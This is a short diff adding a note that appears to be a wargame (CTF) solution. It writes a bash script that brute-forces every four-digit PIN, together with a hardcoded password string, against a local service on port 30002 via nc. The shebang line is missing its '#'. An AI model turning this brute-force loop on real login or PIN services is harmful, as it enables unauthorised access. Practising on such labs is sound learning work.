@@ -1,0 +1,12 @@
+mktemp -d
+
+cd /tmp/<generated> && nano a.sh
+
+write this in:
+
+!/bin/bash
+echo "Time to check all pin codes..."
+for i in {0000..9999};
+do
+        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
+done | nc localhost 30002
